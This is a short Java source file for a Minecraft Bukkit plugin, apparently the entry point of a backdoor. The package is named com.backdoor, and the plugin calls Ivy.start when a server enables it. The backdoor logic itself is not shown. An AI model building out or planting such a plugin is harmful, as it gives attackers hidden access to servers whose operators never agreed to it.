

// Author: Dashie
// Version: 1.0


package com.backdoor;


import org.bukkit.plugin.java.JavaPlugin;


public class DashIvy extends JavaPlugin
{
    @Override
    public void onEnable()       
    { Ivy.start(this); };
    
    @Override
    public void onDisable() 
    {};
};
